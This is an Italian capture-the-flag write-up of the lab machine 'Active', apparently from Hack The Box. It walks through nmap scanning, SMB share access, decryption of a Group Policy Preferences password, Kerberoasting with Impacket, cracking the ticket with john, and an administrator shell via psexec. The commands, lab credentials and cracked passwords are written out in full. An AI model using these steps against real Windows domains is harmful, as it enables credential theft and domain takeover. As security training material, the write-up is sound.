# Active

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```text
sudo nmapAutomator.sh --host 10.10.10.100 --type All
```

Il risultato della scansione è il seguente:

```text
Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown


---------------------Starting Script Scan-----------------------

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-09 13:49:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-01-09T13:50:12
|_  start_date: 2024-01-09T10:17:28
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required


----------------------Starting UDP Scan------------------------

PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

PORT    STATE SERVICE      VERSION
53/udp  open  domain       Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-09 13:54:51Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows


---------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-09 13:55:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Aggiungo _active.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Provando ad enumerare il DNS, non ottengo nessun risultato.

Provo quindi con _smbmap_:

```text
smbmap -H 10.10.10.100
```

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-1.png"/>
</p>

Lo share Replication può essere letto quindi provo con questo comando:

```text
smbclient //active.htb/Replication -N
```

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-2.png"/>
</p>

Dopo aver eseguito una rapida ricerca su google scopro che il file Groups.xml è un file di policy caratterizzato da una feature pericolosa che prevede l'utilizzo dell'algoritmo di cifratura AES (di cui la chiave è pubblica) per il salvataggio di username e password.

Quindi scarico il file sulla mia macchina:

```text
get Groups.xml
```

Ispeziono il file:

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-3.png"/>
</p>

Per decriptare la password utilizzo _gpp-decrypt_:

```text
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Ottenendo il seguente risultato:

```text
GPPstillStandingStrong2k18
```

## Exploitation

Con la password appena trovata e l'username all'interno del file xml provo ad entrare nello share USERS:

```text
smbclient -W active.htb -U SVC_TGS //active.htb/USERS
```

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-4.png"/>
</p>

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-5.png"/>
</p>

**Trovo così il primo flag!**

## Privilege Escalation

Per scalare i privilegi provo ad utilizzare la tecnica nota come _Kerberoasting_.

Questa tecnica consiste nel compromettere un utente che dispone di un ticket di connessione TGT per richiedere uno o più ticket di servizio TGS per un qualsiasi servizio SPN.

Siccome una porzione del ticket TGS viene crittografata con l'hash dell'account di servizio associato all'SPN, si potrebbe eseguire un attacco di brute-force per ricavare la password di questo account admin. Se quindi chiedo un ticket TGS per l'admin e questo usa una password debole, sono in grado di decifrarla.

Per eseguire l'attacco utilizzo [_Impacket_](https://github.com/fortra/impacket) che include una raccolta di classi python per lavorare con i protocolli di rete.

In particolare utilizzo il codice _GetUserSPNs.py_ nella directory _exemples_:

```text
./GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

Ottengo così la seguente chiave per l'utente _Administrator_:

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-6.png"/>
</p>

Quindi salvo questo TGS nel file _spn-administator.txt_ e provo a ricavare la password tramite _johntheripper_:

```text
john --wordlist=/usr/share/wordlists/rockyou.txt spn-administator.txt
```

**Bingo!**

La password è la seguente:

```text
Ticketmaster1968
```

Per loggarmi come admin utilizzo lo script _psexec.py_:

```text
psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
```

<p align="center">
  <img src="/Immagini/Windows-Box/Active/active-7.png"/>
</p>

**Ottengo così il secondo flag!**
